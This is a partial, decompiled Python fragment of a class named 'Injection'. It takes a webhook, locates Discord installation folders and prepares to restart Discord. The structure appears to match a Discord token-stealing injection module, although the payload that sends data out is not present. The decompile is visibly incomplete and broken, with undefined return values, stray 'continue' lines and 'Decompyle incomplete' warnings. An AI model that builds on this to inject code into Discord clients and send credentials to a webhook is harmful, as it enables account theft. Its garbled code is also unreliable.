# pyunpacker v1.0 (by Vault) #

import os
import re
import subprocess
import psutil
import requests

class Injection:
    
    def __init__(self, webhook):
        setattr(self, 'appdata', os.getenv('LOCALAPPDATA'))
        setattr(self, 'discord_dirs', [
            self.appdata + 'Discord',
            self.appdata + 'DiscordCanary',
            self.appdata + 'DiscordPTB',
            self.appdata + 'DiscordDevelopment'])

 # WARNNING: this is not fully unpacked!    # WARNING: Decompyle incomplete

    
    def get_core(self, dir):
        return (core, file)
        continue
        continue

    
    def start_discord(self, dir):
        update = dir + 'Update.exe'
    # WARNING: Decompyle incomplete


